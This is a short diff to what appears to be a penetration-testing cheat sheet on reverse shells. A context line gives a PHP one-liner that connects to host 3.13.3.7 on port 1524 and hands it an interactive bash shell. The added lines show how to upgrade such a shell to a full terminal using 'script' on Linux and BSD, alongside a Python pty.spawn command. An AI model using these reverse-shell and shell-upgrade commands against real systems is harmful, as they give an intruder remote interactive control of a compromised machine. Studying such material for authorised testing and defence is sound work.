@@ -375,6 +375,12 @@ php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:
 
 ```
+$ script -qc /bin/bash /dev/null  # Linux
+$ script -q /dev/null /bin/bash   # BSD
+```
+
+Or:
+```
 # Python
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
